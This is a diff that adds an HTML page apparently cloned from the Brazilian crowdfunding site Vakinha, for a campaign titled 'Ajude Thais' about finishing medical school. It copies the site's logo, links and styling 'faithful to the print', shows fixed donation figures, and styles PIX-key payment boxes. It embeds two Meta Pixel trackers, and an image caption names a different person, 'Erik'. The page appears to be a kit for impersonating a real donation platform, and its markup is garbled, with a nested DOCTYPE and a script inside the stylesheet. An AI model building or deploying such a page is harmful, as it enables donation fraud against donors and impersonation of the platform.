@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Ajude Thais</title>
+<link rel="icon" href="https://www.vakinha.com.br/static/_images/favicon.ico">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+/* Reset Básico */
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Lato',Arial,sans-serif;-webkit-font-smoothing:antialiased;}
+html{font-size:16px; scroll-behavior: smooth;}
+body{background:#f9f9f9;color:#282828;}
+a{text-decoration:none;color:inherit;}
+
+/* NAV */
+.nav{position:fixed;top:0;left:0;right:0;height:70px;background:#fff;z-index:200;border-bottom:2px solid #f1f0f0;display:flex;align-items:center;}
+.nav-inner{max-width:1200px;margin:0 auto;width:100%;padding:0 20px;display:flex;align-items:center;justify-content:space-between;}
+.nav-logo svg{display:block;}
+.nav-right{display:flex;align-items:center;gap:8px;}
+.nav-link{font-size:15px;color:#282828;padding:8px 10px;cursor:pointer;display:flex;align-items:center;gap:4px;}
+.nav-link:hover{color:#5a5a5a;}
+.nav-link svg{width:16px;height:16px;fill:#282828;}
+.nav-search{display:flex;align-items:center;gap:4px;color:#24ca68;font-size:15px;padding:8px 10px;}
+.nav-search svg{width:20px;height:20px;fill:#24ca68;}
+.btn-create{background:#24ca68;color:#fff;border:none;border-radius:5px;padding:10px 18px;font-size:14px;font-weight:700;cursor:pointer;white-space:nowrap;}
+.btn-create:hover{background:#1db558;}
+.nav-mobile{display:none;}
+
+/* LAYOUT */
+.spacer{height:70px;}
+.container{max-width:1200px;margin:0 auto;padding:0 20px;}
+.page-grid{display:grid;grid-template-columns:1fr 360px;gap:32px;padding:24px 0 60px;}
+
+/* LEFT COLUMN */
+.campaign-image{position:relative;border-radius:8px;overflow:hidden;margin-bottom:12px; background-color: #e8f5e9;}
+.campaign-image img{width:100%;display:block;max-height:430px;object-fit:cover;}
+.heart-btn{position:absolute;top:12px;right:12px;width:44px;height:44px;background:#fff;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 6px rgba(0,0,0,.2);}
+.heart-btn:hover{background:#f5f5f5;}
+.heart-btn svg{width:40px;height:40px;}
+.tags-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px; flex-wrap: wrap; gap: 8px;}
+.category{font-size:11px;color:#8a8a8a;text-transform:uppercase;letter-spacing:.04em;font-weight:700;}
+.location{display:flex;align-items:center;gap:3px;font-size:11px;color:#8a8a8a;text-transform:uppercase;font-weight:700;}
+.location svg{width:14px;height:14px;fill:#8a8a8a;}
+h1.campaign-title{font-size:24px;font-weight:900;line-height:1.2;color:#282828;margin-bottom:6px;}
+.campaign-id{font-size:14px;font-weight:700;color:#282828;margin-bottom:16px;}
+.short-desc{font-size:14px;color:#282828;line-height:1.6;margin-bottom:20px;}
+.short-desc span{color:#24ca68;cursor:pointer;font-weight:700;}
+
+/* TABS */
+.tabs-wrap{border-bottom:2px solid #f1f0f0;overflow-x:auto;display:flex;white-space:nowrap;scrollbar-width:none;margin-bottom:24px;-webkit-overflow-scrolling:touch;}
+.tabs-wrap::-webkit-scrollbar{display:none;}
+.tab{display:inline-block;padding:12px 16px;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;color:#8a8a8a;font-weight:700;flex-shrink:0;}
+.tab.active{border-bottom-color:#24ca68;color:#24ca68;}
+.tab:hover{color:#282828;}
+
+/* SOBRE */
+.pix-row{display:flex;align-items:center;gap:8px;margin-bottom:16px;flex-wrap:wrap;}
+.pix-label{font-size:14px;color:#282828;}
+.pix-key{font-size:15px;font-weight:700;color:#282828;display:flex;align-items:center;gap:6px;cursor:pointer; word-break: break-all;}
+.pix-key svg{width:20px;height:20px;fill:#282828; flex-shrink: 0;}
+.divider{height:1px;background:#f1f0f0;margin:16px 0;}
+.created-date{font-size:13px;color:#282828;margin-bottom:12px;}
+.description{font-size:14px;line-height:1.75;color:#282828;}
+.description h3{font-size:15px;font-weight:700;margin-bottom:8px;}
+.description p{margin-bottom:12px;}
+.description strong{font-weight:700;}
+.pix-card{background:#f5f5f5;border-radius:6px;padding:16px;margin:24px 0;display:flex;flex-direction:column;gap:12px;}
+.pix-card-row{display:flex;align-items:center;gap:12px;}
+.pix-card-row svg{width:28px;height:28px;flex-shrink:0;}
+.pix-card-text{font-size:14px;color:#282828;line-height:1.5; word-break: break-word;}
+.pix-card-copy{display:flex;align-items:center;justify-content:center;gap:6px;cursor:pointer;border-top:1px solid #e0e0e0;padding-top:10px;}
+.pix-card-copy span{font-size:14px;font-weight:700;color:#282828;text-decoration:underline;}
+.pix-card-copy svg{width:18px;height:18px;fill:#282828;}
+.report-link{font-size:14px;font-weight:700;text-decoration:underline;color:#282828;display:block;margin-bottom:8px;}
+.aviso{font-size:12px;color:#8a8a8a;line-height:1.5;margin-bottom:32px;}
+
+/* SIDEBAR desktop */
+.sidebar{position:sticky;top:90px;align-self:start;}
+.progress-bar{width:100%;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden;margin-bottom:12px;}
+.progress-fill{height:100%;background:#24ca68;border-radius:2px;width:0.96%;}
+.collected-label{font-size:13px;color:#8a8a8a;font-weight:700;margin-bottom:4px;}
+.collected-value{font-size:28px;font-weight:900;color:#24ca68;line-height:1;}
+.collected-goal{font-size:14px;color:#8a8a8a;margin-bottom:16px;}
+.stats-box{border:1px solid #c8f0dc;border-radius:6px;overflow:hidden;margin-bottom:16px;background:#f0faf5;}
+.stat-row{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;font-size:14px;}
+.stat-row:not(:last-child){border-bottom:1px solid #c8f0dc;}
+.stat-label{display:flex;align-items:center;gap:6px;color:#282828;}
+.stat-value{font-weight:700;color:#282828;}
+.btn-donate{width:100%;padding:18px;background:#24ca68;color:#fff;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:12px;letter-spacing:.01em;}
+.btn-donate:hover{background:#1db558;}
+.btn-share{width:100%;padding:16px;background:#fff;color:#282828;font-size:18px;font-weight:700;border:2px solid #e0e0e0;border-radius:8px;cursor:pointer;}
+.btn-share:hover{background:#f5f5f5;}
+.doacao-badge{display:inline-flex;align-items:center;gap:8px;border:1.5px solid #009d4e;border-radius:20px;padding:7px 14px;background:#f0faf5;margin:16px 0;}
+.doacao-badge svg{width:20px;height:20px;flex-shrink:0;}
+.doacao-badge span{font-size:11px;font-weight:900;color:#1a6e2e;letter-spacing:.08em;text-transform:uppercase;}
+.organizer{display:flex;align-items:center;gap:12px;margin-top:16px;}
+.organizer-avatar{width:45px;height:45px;border-radius:50%;object-fit:cover;border:3px solid #f1f0f0;flex-shrink:0;background:#e8f5e9;}
+.organizer-info{font-size:13px;}
+.organizer-info .name{font-weight:700;color:#282828;}
+.organizer-info .since{color:#8a8a8a;}
+
+/* MOBILE STATS PANEL & BOTTOM BAR DEFAULT (HIDDEN) */
+.mobile-stats-panel{display:none;}
+.mobile-bottom{display:none;}
+
+/* FOOTER */
+footer{background:#282828;color:#fff;padding:40px 0 0;}
+.footer-inner{max-width:1200px;margin:0 auto;padding:0 20px;}
+.footer-top{display:flex;flex-wrap:wrap;gap:32px;margin-bottom:32px;}
+.footer-logo-social{display:flex;flex-direction:column;gap:20px;}
+.footer-social{display:flex;align-items:center;gap:12px;}
+.footer-social a{display:flex;align-items:center;color:#fff;opacity:.8;}
+.footer-social a:hover{opacity:1;}
+.footer-social svg{width:22px;height:22px;fill:#fff;}
+.footer-social .sep{width:1px;height:16px;background:#fff;opacity:.3;}
+.footer-links{display:grid;grid-template-columns:1fr 1fr;gap:6px;}
+.footer-links a{font-size:14px;color:#fff;opacity:.8;display:block; padding: 4px 0;}
+.footer-links a:hover{opacity:1;}
+.footer-col h6{font-size:14px;font-weight:700;color:#24ca68;margin-bottom:16px;}
+.footer-contact p{font-size:13px;color:#fff;opacity:.8;line-height:1.7;}
+.footer-apps{display:flex;flex-direction:column;gap:10px;margin-top:8px;}
+.footer-apps a{display:inline-block;}
+.footer-cnpj{font-size:12px;color:#fff;opacity:.6;margin-top:10px;line-height:1.8;}
+.footer-bottom{background:#1a1a1a;text-align:center;padding:14px 20px;margin-top:32px;}
+.footer-bottom p{font-size:13px;color:#fff;opacity:.7;}
+.footer-seal img{height:36px;margin-top:12px;}
+
+/* =========================================
+   INÍCIO DAS REGRAS PARA O CELULAR (MOBILE)
+   ========================================= */
+@media(max-width:991px){
+  /* Base - Fundo cinza claro oficial para dar o destaque de camadas */
+  body { background: #f9f9f9 !important; }
+  .spacer{height:60px;}
+  .container { padding: 0 16px; }
+  
+  /* Grid Central vira 1 coluna com respiro pro botão fixo no final */
+  .page-grid{grid-template-columns:1fr; gap:0; padding:16px 0 200px;}
+  
+  /* CARDS DO SITE - Adiciona o fundo branco por cima do fundo cinza para dar o efeito do print */
+  .campaign-card, .pix-box, .tab-content {
+    background: #ffffff !important;
+    padding: 16px;
+    border-radius: 8px;
+    margin-bottom: 12px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.02) !important;
+  }
+  
+  /* Navbar */
+  .nav{height:60px;}
+  .nav-desktop{display:none;}
+  .nav-mobile{display:flex;align-items:center;gap:16px;}
+  .nav-mobile svg{width:24px;height:24px;fill:#282828;}
+  .nav-logo svg { width: 110px; height: auto; } /* Diminui o logo no mobile */
+
+  /* Textos Principais */
+  h1.campaign-title{font-size:20px;}
+  
+  /* Remove a barra lateral do desktop */
+  .sidebar{display:none;}
+  
+  /* Ativa o Painel de Status do Mobile */
+  .mobile-stats-panel{
+    display:block;
+    margin-bottom:24px;
+  }
+  .mobile-stats-panel .progress-bar{height:4px;margin-bottom:10px;}
+  .mobile-stats-panel .collected-value{
+    font-size:24px;
+    font-weight:900;
+    color:#24ca68;
+    margin-bottom:16px;
+    display:flex;
+    align-items:baseline;
+    gap:6px;
+    flex-wrap:wrap;
+  }
+  .mobile-stats-panel .collected-goal{font-size:14px;font-weight:400;color:#8a8a8a;}
+  
+  /* CAIXA DE STATUS (Corações e Apoiadores) - Fundo Branco e Borda Verde Calibrada */
+  .mobile-stats-panel .stats-box{
+    background: #ffffff !important;
+    border: 1px solid #eeffe6 !important;
+    border-radius: 8px;
+    margin-bottom: 16px;
+    padding: 16px !important;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+  .mobile-stats-panel .stat-row{
+    padding: 0 !important;
+    border-bottom: none !important;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .mobile-stats-panel .stat-row:not(:last-child){border-bottom: none !important;}
+  
+  /* Ativa os Botões Fixos no Rodapé do Mobile */
+  .mobile-bottom{
+    display:block;
+    position:fixed;
+    bottom:0;
+    left:0;
+    right:0;
+    background:#fff;
+    z-index:200;
+    box-shadow:0 -4px 12px rgba(0,0,0,.08);
+  }
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1520472869160223');
+fbq('init', '1762981111690468');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1520472869160223&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+   
+  /* BARRA DOAÇÃO PROTEGIDA - Paleta exata de 3 tons do original */
+  .mb-protected{
+    background: #d5fac3 !important; /* Tom 1: Verde Clarido de Fundo */
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:8px 16px;
+  }
+  .mb-protected-badge{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    border:1px solid #1a6e2e !important;
+    border-radius:30px;
+    padding:4px 12px 4px 6px !important;
+    background: #ffffff !important; /* Tom 2: Fundo Interno Branco */
+  }
+  .mb-protected-badge span{
+    font-size:11px;
+    font-weight:900;
+    color:#1a6e2e !important; /* Tom 3: Texto Verde Escuro */
+    letter-spacing:.05em;
+    text-transform:uppercase;
+  }
+  .mb-btns{
+    padding:12px 16px 16px;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+    background:#fff;
+  }
+  .mb-btns .btn-donate{
+    margin:0;padding:16px;font-size:18px;border-radius:8px;
+    background:#24ca68;color:#fff;font-weight:700;border:none;width:100%; cursor: pointer;
+  }
+  .mb-btns .btn-share{
+    margin:0;padding:16px;font-size:18px;border-radius:8px;
+    background:#fff;color:#282828;font-weight:700;border:2px solid #e0e0e0;width:100%; cursor: pointer;
+  }
+  
+  /* Footer Mobile Adjustment */
+  .footer-links{grid-template-columns: 1fr;} /* Transforma os links do footer em 1 coluna */
+}
+/* =========================================
+   FIM DAS REGRAS PARA O CELULAR
+   ========================================= */
+
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="https://www.vakinha.com.br/" class="nav-logo">
+      <svg xmlns="http://www.w3.org/2000/svg" width="150" height="40" fill="none" viewBox="0 0 123 32">
+        <path fill="#24CA68" fill-rule="evenodd" d="M5.11 0h24.923a5.18 5.18 0 0 1 3.609 1.471 4.97 4.97 0 0 1 1.5 3.537v18.16q.001.119-.004.232V32l-6.636-3.82H5.11a5.18 5.18 0 0 1-3.609-1.472A4.97 4.97 0 0 1 0 23.171V5.011a4.97 4.97 0 0 1 1.501-3.538A5.18 5.18 0 0 1 5.111.002zm12.655 17.262q-.285 0-.566.037l-4.695-7.981a3.12 3.12 0 0 0-.402-3.833 3.26 3.26 0 0 0-1.83-.956c-.702-.114-1.421.002-2.048.33A3.2 3.2 0 0 0 6.8 6.338a3.1 3.1 0 0 0-.213 2.023 3.16 3.16 0 0 0 1.084 1.734 3.27 3.27 0 0 0 1.935.733l4.78 8.117a4.022 4.022 0 0 0-.34 4.25c.348.671.877 1.235 1.53 1.63a4.237 4.237 0 0 0 4.35.02 4.1 4.1 0 0 0 1.546-1.617 4.02 4.02 0 0 0-.301-4.253l4.797-8.142c.71-.03 1.39-.288 1.935-.734a3.16 3.16 0 0 0 1.082-1.734 3.1 3.1 0 0 0-.214-2.022 3.2 3.2 0 0 0-1.423-1.48 3.3 3.3 0 0 0-2.047-.328c-.7.113-1.343.45-1.83.956a3.12 3.12 0 0 0-.4 3.831l-4.703 7.981q-.299-.045-.602-.045z" clip-rule="evenodd"/>
+        <path fill="#24CA68" d="M42.39 12.184a3.8 3.8 0 0 1-.212-.874 1.67 1.67 0 0 1 .437-1.27 1.65 1.65 0 0 1 1.23-.526c.408-.002.805.141 1.119.405s.524.631.594 1.037l2.302 7.797h.046l2.301-7.797c.07-.406.28-.774.594-1.038a1.72 1.72 0 0 1 1.12-.404 1.64 1.64 0 0 1 1.229.526 1.66 1.66 0 0 1 .438 1.27q-.051.451-.212.874l-3.241 9.075c-.329.921-.545 1.228-2.254 1.228s-1.924-.307-2.253-1.228zM65.535 18.841c.045.781.166 1.557.359 2.315a1.43 1.43 0 0 1-.509.985 1.46 1.46 0 0 1-1.062.338 1.9 1.9 0 0 1-1.495-.53 1.86 1.86 0 0 1-.551-1.478 6 6 0 0 1-2.149 1.54 6 6 0 0 1-2.608.468 3.74 3.74 0 0 1-2.704-.945 3.7 3.7 0 0 1-1.222-2.573c0-2.858 2.189-3.66 4.854-3.967l2.116-.237c.827-.089 1.5-.283 1.5-1.278 0-.994-1.025-1.416-2.19-1.416-2.576 0-2.642 1.89-4.022 1.89a1.4 1.4 0 0 1-1.019-.352 1.37 1.37 0 0 1-.453-.971c0-1.369 1.951-3.116 5.519-3.116 3.332 0 5.64 1.063 5.64 3.542zm-3.474-2.48c-.444.308-.961.495-1.5.544l-1.261.188c-1.452.213-2.237.662-2.237 1.7 0 .78.735 1.417 1.93 1.417 1.905 0 3.071-1.228 3.071-2.502zM67.65 6.882c0-.45.173-.88.48-1.197a1.6 1.6 0 0 1 1.158-.496c.434 0 .85.179 1.157.496s.48.748.48 1.197v7.694l3.637-4.173c.154-.192.346-.349.562-.46a1.7 1.7 0 0 1 .694-.19c.396.009.775.17 1.062.454s.46.668.486 1.077c.009.213-.031.424-.117.618a1.34 1.34 0 0 1-.376.495l-2.427 2.623 3.409 4.729c.221.317.34.699.338 1.09.001.428-.16.84-.45 1.148-.288.308-.683.487-1.097.498a1.63 1.63 0 0 1-.841-.19 1.7 1.7 0 0 1-.64-.597l-3.094-4.521-1.144 1.043v2.574c0 .449-.173.88-.48 1.197a1.6 1.6 0 0 1-1.158.495 1.6 1.6 0 0 1-1.157-.495 1.72 1.72 0 0 1-.48-1.197zM80.83 5.19a1.76 1.76 0 0 1 1.723 1.41 1.75 1.75 0 0 1-1.051 1.96 1.76 1.76 0 0 1-2.134-.645 1.75 1.75 0 0 1 .22-2.213 1.76 1.76 0 0 1 1.242-.513m-1.689 6.318a1.68 1.68 0 0 1 1.043-1.555 1.69 1.69 0 0 1 2.205.911c.085.204.129.423.129.644v9.295a1.69 1.69 0 0 1-3.377 0zM84.344 11.243c0-1.039.461-1.725 1.522-1.725s1.523.686 1.523 1.725v.446h.047a4.87 4.87 0 0 1 1.772-1.618 4.73 4.73 0 0 1 2.312-.557c2.03 0 4.245 1.04 4.245 4.538v6.71c0 .457-.177.896-.493 1.22a1.67 1.67 0 0 1-1.191.505c-.447 0-.875-.182-1.191-.505a1.75 1.75 0 0 1-.493-1.22v-6.027c0-1.394-.67-2.387-2.124-2.387-.69.015-1.347.31-1.827.818a2.71 2.71 0 0 0-.734 1.9v5.693c0 .458-.177.896-.493 1.22a1.67 1.67 0 0 1-1.191.505c-.447 0-.875-.182-1.19-.505a1.75 1.75 0 0 1-.494-1.22zM98.4 6.882c0-.449.178-.88.494-1.197a1.68 1.68 0 0 1 2.382 0c.316.318.493.748.493 1.197v4.66h.047a4.51 4.51 0 0 1 3.761-1.786c2.03 0 4.246 1.02 4.246 4.452v6.586c0 .449-.178.88-.494 1.197a1.68 1.68 0 0 1-2.382 0 1.7 1.7 0 0 1-.493-1.197v-5.916c0-1.369-.669-2.343-2.122-2.343a2.6 2.6 0 0 0-1.828.803 2.64 2.64 0 0 0-.733 1.864v5.588c0 .45-.177.88-.493 1.197a1.682 1.682 0 0 1-2.876-1.197zM122.642 18.841c.046.781.166 1.557.359 2.315a1.43 1.43 0 0 1-.509.985 1.46 1.46 0 0 1-1.062.338 1.9 1.9 0 0 1-1.496-.53 1.86 1.86 0 0 1-.55-1.478 6 6 0 0 1-2.149 1.54 6 6 0 0 1-2.608.468 3.74 3.74 0 0 1-2.704-.945 3.663 3.663 0 0 1-1.222-2.573c0-2.858 2.189-3.66 4.855-3.967l2.115-.237c.834-.089 1.5-.283 1.5-1.278 0-.994-1.023-1.416-2.189-1.416-2.575 0-2.641 1.89-4.022 1.89a1.39 1.39 0 0 1-1.345-.792 1.4 1.4 0 0 1-.127-.531c0-1.369 1.951-3.116 5.518-3.116 3.332 0 5.641 1.063 5.641 3.542zm-3.475-2.48c-.443.307-.96.494-1.498.544l-1.261.188c-1.452.213-2.237.662-2.237 1.7 0 .78.735 1.417 1.931 1.417 1.903 0 3.069-1.228 3.069-2.502z"/>
+      </svg>
+    </a>
+    <div class="nav-right nav-desktop">
+      <div class="nav-link">Como ajudar <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+      <div class="nav-link">Descubra <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+      <div class="nav-link">Como funciona <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+      <a href="https://www.vakinha.com.br/buscar-vaquinha" class="nav-search">Buscar <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"/></svg></a>
+      <a href="https://www.vakinha.com.br/users/sign_in" class="nav-link">Minha conta</a>
+      <a href="https://www.vakinha.com.br/criar-vaquinha"><button class="btn-create">Faz uma vaquinha!</button></a>
+    </div>
+    <div class="nav-mobile">
+      <a href="https://www.vakinha.com.br/buscar-vaquinha"><svg viewBox="0 0 24 24" fill="#24ca68"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"/></svg></a>
+      <svg viewBox="0 0 24 24"><path d="M3 18h12v-2H3zM3 6v2h18V6zm0 7h18v-2H3z"/></svg>
+    </div>
+  </div>
+</nav>
+<div class="spacer"></div>
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  /* 1. Reset básico e Container */
+  .container {
+    max-width: 100%;
+    padding: 16px; /* Evita que o conteúdo cole nas bordas da tela */
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+
+  /* 2. Imagem Responsiva e Botão Sobreposto */
+  .campaign-image {
+    position: relative; /* Permite posicionar o botão do coração por cima */
+    width: 100%;
+    border-radius: 12px;
+    overflow: hidden; /* Mantém os cantos arredondados na imagem */
+    margin-bottom: 16px;
+  }
+
+  .campaign-image img {
+    width: 100%; /* Faz a imagem ocupar 100% da largura do celular */
+    height: auto; /* Mantém a proporção sem achatar */
+    display: block;
+    object-fit: cover;
+  }
+
+  .heart-btn {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  /* Mudei de rgba(0,0,0,0.2) para transparente */
+  background: transparent; 
+  border: none;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0;
+}
+  
+  .heart-btn {
+  /* ... resto do código ... */
+  background: transparent;
+  filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.3)); /* Sombra apenas no ícone, não no fundo */
+}
+
+  /* 3. Tags (Categoria e Localização) */
+  .tags-row {
+    display: flex;
+    flex-wrap: wrap; /* Se não couber, quebra a linha em celulares muito pequenos */
+    gap: 12px;
+    margin-bottom: 12px;
+    font-size: 14px;
+  }
+
+  .category {
+    background-color: #f1f3f5;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-weight: 600;
+    color: #495057;
+  }
+
+  .location {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    color: #868e96;
+  }
+
+  .location svg {
+    width: 16px;
+    height: 16px;
+    fill: currentColor;
+  }
+
+  /* 4. Título e ID */
+  .campaign-title {
+    font-size: 24px;
+    line-height: 1.2;
+    margin: 0 0 4px 0;
+    color: #212529;
+  }
+
+  .campaign-id {
+    font-size: 12px;
+    color: #adb5bd;
+    margin-top: 0;
+    margin-bottom: 20px;
+  }
+
+  /* 5. Painel de Estatísticas */
+  .mobile-stats-panel {
+    background-color: #ffffff;
+    padding: 16px;
+    border-radius: 12px;
+  }
+
+  .progress-bar {
+    width: 100%;
+    height: 8px;
+    background-color: #dee2e6;
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 12px;
+  }
+
+  .progress-fill {
+    width: 20%; /* Aqui você ajusta via JS conforme a % arrecadada */
+    height: 100%;
+    background-color: #24ca68;
+    border-radius: 4px;
+  }
+
+  .collected-value {
+    font-size: 20px;
+    font-weight: bold;
+    color: #24ca68;
+    margin-bottom: 16px;
+  }
+
+  .collected-goal {
+    font-size: 14px;
+    color: #868e96;
+    font-weight: normal;
+    display: block; /* Joga a meta para a linha de baixo no celular */
+    margin-top: 4px;
+  }
+
+  .stats-box {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .stat-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 15px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #e9ecef;
+  }
+
+  .stat-row:last-child {
+    border-bottom: none;
+    padding-bottom: 0;
+  }
+
+  .stat-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #495057;
+  }
+
+  .stat-value {
+    font-weight: bold;
+    color: #212529;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="page-grid">
+    <div>
+      <div class="campaign-image">
+        <img src="images/WhatsApp%20Image%202026-07-19%20at%2023.18.27.jpeg" alt="Erik sonha em ajudar a mãe e precisa da sua força." onerror="this.style.background='#e8f5e9';this.removeAttribute('src')">
+        <button class="heart-btn" id="heartBtn" onclick="toggleHeart()">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40">
+            <circle cx="20" cy="20" r="20" fill="#fff"/>
+            <path id="heartPath" d="M10.789,2.572A6.652,6.652,0,0,0,3.739.285C.819,1.21-.387,4.422.109,7.262c.785,4.507,5.706,9,9.964,10.666a1.976,1.976,0,0,0,.7.142h.037a1.923,1.923,0,0,0,.695-.142c4.3-1.7,9.179-6.159,9.965-10.666a7.373,7.373,0,0,0,.108-1.192V5.946A5.729,5.729,0,0,0,17.839.285,6.029,6.029,0,0,0,16.014,0a6.9,6.9,0,0,0-5.225,2.572" transform="translate(9 11)" fill="#dadada"/>
+          </svg>
+        </button>
+      </div>
+      
+      <div class="tags-row">
+        <span class="category">Educação / Aprendizagem</span>
+        <span class="location">
+          <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7m0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5"/></svg>
+          São José dos Campos / SP
+        </span>
+      </div>
+      
+      <h1 class="campaign-title">Depois de tudo que a minha família sacrificou, falta só um passo para eu me formar médica. Você me ajuda a chegar até o fim?</h1>
+      <p class="campaign-id">ID: 5333124</p>
+
+      <style>
+      /* Ajustes precisos para o painel de status (Fiel ao print) */
+      .mobile-stats-panel {
+        display: block;
+        margin-bottom: 24px;
+      }
+      .mobile-stats-panel .progress-bar {
+        height: 4px;
+        background: #f1f0f0; /* Fundo cinza clarinho */
+        border-radius: 2px;
+        margin-bottom: 12px;
+      }
+      .mobile-stats-panel .progress-fill {
+        height: 100%;
+        background: #24ca68;
+        border-radius: 2px;
+        width: 10%; /* Representa o tracinho inicial da barra */
+      }
+      .mobile-stats-panel .collected-value {
+        font-size: 24px;
+        font-weight: 900;
+        color: #24ca68;
+        margin-bottom: 16px;
+        display: flex;
+        align-items: baseline;
+        gap: 6px;
+        flex-wrap: wrap;
+      }
+      .mobile-stats-panel .collected-goal {
+        font-size: 16px; /* Tamanho proporcional ao R$ principal */
+        font-weight: 400;
+        color: #8a8a8a;
+      }
+      .mobile-stats-panel .stats-box {
+        background: #eeffe6 !important; /* Verde clarinho sólido igual ao print */
+        border: none !important;
+        border-radius: 8px;
+        padding: 16px !important; /* Espaçamento interno perfeitamente distribuído */
+        display: flex;
+        flex-direction: column;
+        gap: 12px; /* Distância exata entre as duas linhas de texto */
+      }
+      .mobile-stats-panel .stat-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: none !important; /* Remove a linha divisória que tinha antes */
+        padding: 0 !important; /* Reseta o respiro antigo */
+      }
+      .mobile-stats-panel .stat-label {
+        font-size: 14px;
+        color: #4a4a4a;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .mobile-stats-panel .stat-value {
+        font-size: 14px;
+        font-weight: 700;
+        color: #282828;
+      }
+    </style>
+
+    <div class="mobile-stats-panel">
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="collected-value">R$ 2.377,02 <span class="collected-goal">de R$ 81.000,00</span></div>
+        <div class="stats-box">
+          <div class="stat-row">
+            <span class="stat-label">
+  Corações Recebidos
+  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 18.319 15.34">
+    <path d="M16.485,1.524a4.425,4.425,0,0,0-6.326,0L9.159,2.525,8.16,1.524a4.425,4.425,0,0,0-6.326,0,4.8,4.8,0,0,0,0,6.726l7.325,7.086,7.326-7.086A4.8,4.8,0,0,0,16.485,1.524Z" fill="#007a47"/>
+  </svg>
+</span>
+                <!-- Substituído o degradê por um verde sólido idêntico ao do print -->
+                <path d="M9.16,2.184A5.647,5.647,0,0,0,3.174.242C.695,1.027-.329,3.754.092,6.165c.667,3.826,4.845,7.644,8.459,9.055a1.678,1.678,0,0,0,.6.12h.032a1.633,1.633,0,0,0,.59-.12c3.649-1.445,7.792-5.229,8.46-9.055a6.259,6.259,0,0,0,.091-1.012V5.048A4.864,4.864,0,0,0,15.145.242,5.119,5.119,0,0,0,13.6,0,5.855,5.855,0,0,0,9.16,2.184" fill="#edffe6"/>
+              </svg>
+            </span>
+            <span class="stat-value">1755</span>
+          </div>
